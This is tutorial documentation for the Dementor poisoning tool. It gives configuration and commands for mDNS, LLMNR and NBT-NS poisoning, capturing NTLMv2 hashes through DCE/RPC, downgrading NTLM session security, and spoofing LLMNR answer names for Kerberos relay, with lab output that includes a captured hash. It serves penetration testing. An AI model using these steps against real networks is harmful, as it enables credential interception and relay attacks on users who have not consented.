.. _examples_multicast:

Multicast Poisoning ⚙️
======================

.. _example_multicast_mdns:

Classic Multicast Poisoning
---------------------------

To enable multicast poisoning, activate the poisoners in the configuration file
(:attr:`Dementor.mDNS`, :attr:`Dementor.NBTNS`, and :attr:`Dementor.LLMNR`).

.. tab-set::

    .. tab-item:: Dementor.toml

        .. code-block:: toml
            :emphasize-lines: 3-5

            [Dementor]
            # [...]
            mDNS = true
            LLMNR = true
            NBTNS = true
            # [...]

    .. tab-item:: CLI

        .. code-block:: console

            $ Dementor -I "$INTERFACE" -O LLMNR=On -O mDNS=On -O NBTNS=On

You can trigger a discovery request from a Windows host, assuming mDNS is active. For example,
trying to access the file share ``\\FILESERVER01`` via File Explorer causes Windows to fall back to
mDNS when DNS resolution fails.

Dementor output in analyze mode should look like this:

.. container:: demo

    .. code-block:: console

        $ Dementor -I <INTERFACE> -A
        [...]
        MDNS       192.168.56.115  5353   [*] Request for FILESERVER01.local (class: IN, type: A)
        MDNS       192.168.56.115  5353   [*] Request for FILESERVER01.local (class: IN, type: AAAA)
        [...]

The Windows client issues two queries: one for IPv4 (``A``) and one for IPv6 (``AAAA``). These are
sent using Layer 2 broadcast and Layer 3 multicast to all devices on the subnet. Since mDNS is
link-local only, all hosts listening on port ``5353`` will receive the request.

----

.. _examples_multicast_rpc:

Using Multicast Poisoning for DCE/RPC Calls
-------------------------------------------

Multicast poisoning can also be used to capture NTLM hashes via DCE/RPC requests using Dementor's
built-in :ref:`config_dcerpc` service. By default, any call involving DCOM or the Endpoint Mapper (EPM)
is available.

.. tab-set::

    .. tab-item:: Dementor.toml

        .. code-block:: toml
            :emphasize-lines: 3

            [Dementor]
            # [...]
            RPC = true
            # [...]

    .. tab-item:: CLI

        .. code-block:: console

            $ Dementor -I "$INTERFACE" -O RPC=On

.. hint::
    You can attempt to downgrade the captured NTLM hash using :attr:`NTLM.ExtendedSessionSecurity`.
    To test this via the CLI:

    .. code-block:: console

        $ Dementor -I "$INTERFACE" -O RPC=On -O RPC.ExtendedSessionSecurity=Off

To trigger a multicast-based RPC call, use a Windows tool such as ``gpresult`` to request Group
Policy data from a machine whose name will be resolved via mDNS:

.. container:: demo

    .. code-block:: text

        PS C:\Users\padawan> gpresult /S GROUPOLICYSRV /Z
        Type the password for OUTPOST\padawan:

If successful, Dementor will output something similar, including a captured NTLMv2 hash:

.. container:: demo

    .. code-block:: console
        :emphasize-lines: 4,8-10

        $ Dementor -I "$INTERFACE" -O RPC=On
        # [...]
        MDNS       192.168.56.120            5353   [*] Request for GROUPOLICYSRV.local (class: IN, type: AAAA)
        MDNS       192.168.56.120            5353   [+] Sent poisoned answer to 192.168.56.120
        # [...]
        DCE/RPC    192.168.56.120 135    [*] Bind request for [MS-DCOM]: Distributed Component Object Model (DCOM) Remote v0.0 (TransferSyntax Negotiation)
        DCE/RPC    192.168.56.120 135    [*] Bind request for [MS-DCOM]: Distributed Component Object Model (DCOM) Remote v0.0 (NTLMSSP_NEGOTIATE)
        DCE/RPC    192.168.56.120 135    [+] Captured NTLMv2 Hash for padawan/OUTPOST from fe80::a0c0:8ed2:6788:65f1:
        DCE/RPC    192.168.56.120 135    NTLMv2 Username: padawan
        DCE/RPC    192.168.56.120 135    NTLMv2 Hash: padawan::OUTPOST:313333374c454554:025aae2633c04b165fe8a601ed483fa4[...]

----

.. _examples_multicast_llmnr_answername:

LLMNR Answer-Name Spoofing
--------------------------

Beyond traditional multicast poisoning, Synacktiv introduced a technique that enables Kerberos
relaying via spoofed response names. This can be triggered by setting a custom
:attr:`LLMNR.AnswerName`.

.. tab-set::

    .. tab-item:: Dementor.toml

        .. code-block:: toml
            :emphasize-lines: 2

            [LLMNR]
            AnswerName = "other-srv"

    .. tab-item:: CLI

        .. code-block:: console

            $ Dementor -I "$INTERFACE" -O LLMNR.AnswerName="other-srv"

.. seealso::

    Synacktiv's excellent write-up on abusing this for pre-authenticated Kerberos relay attacks:

    - `Abusing multicast poisoning for pre-authenticated Kerberos relay over HTTP with Responder and krbrelayx <https://www.synacktiv.com/publications/abusing-multicast-poisoning-for-pre-authenticated-kerberos-relay-over-http-with>`_

Example output when using a spoofed LLMNR answer name:

.. container:: demo

    .. code-block:: console
        :caption: Dementor output if :attr:`LLMNR.AnswerName` is set (here ``"other-srv"``)
        :emphasize-lines: 2,4

        LLMNR      192.168.56.116            5355   [*] Query for SomeService (type: A)
        LLMNR      192.168.56.116            5355   [+] Sent poisoned answer to 192.168.56.116 (spoofed name: other-srv)
        LLMNR      fe80::8930:4b9c:f67c:f9bf 5355   [*] Query for SomeService (type: AAAA)
        LLMNR      fe80::8930:4b9c:f67c:f9bf 5355   [+] Sent poisoned answer to fe80::8930:4b9c:f67c:f9bf (spoofed name: other-srv)
        LLMNR      192.168.56.116            5355   [*] Query for SomeService (type: AAAA)
        LLMNR      192.168.56.116            5355   [+] Sent poisoned answer to 192.168.56.116 (spoofed name: other-srv)
        LLMNR      fe80::8930:4b9c:f67c:f9bf 5355   [*] Query for SomeService (type: A)
        LLMNR      fe80::8930:4b9c:f67c:f9bf 5355   [+] Sent poisoned answer to fe80::8930:4b9c:f67c:f9bf (spoofed name: other-srv)
        LLMNR      192.168.56.116            5355   [*] Query for SomeService (type: A)
        LLMNR      192.168.56.116            5355   [+] Sent poisoned answer to 192.168.56.116 (spoofed name: other-srv)

